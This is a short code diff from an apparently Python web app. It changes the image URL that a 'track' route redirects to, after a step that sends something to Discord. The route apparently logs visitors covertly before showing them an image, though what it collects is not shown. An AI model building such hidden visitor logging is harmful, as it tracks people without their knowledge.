@@ -45,7 +45,7 @@ def track():
             print(f"Error sending to Discord: {str(e)}")
 
         # Redirect to a safe placeholder image
-        return redirect("https://via.placeholder.com/150")
+        return redirect("https://www.smartage.pl/wp-content/uploads/2023/04/67-1.jpg")
     
     except Exception as e:
         # Log the error and return a friendly message
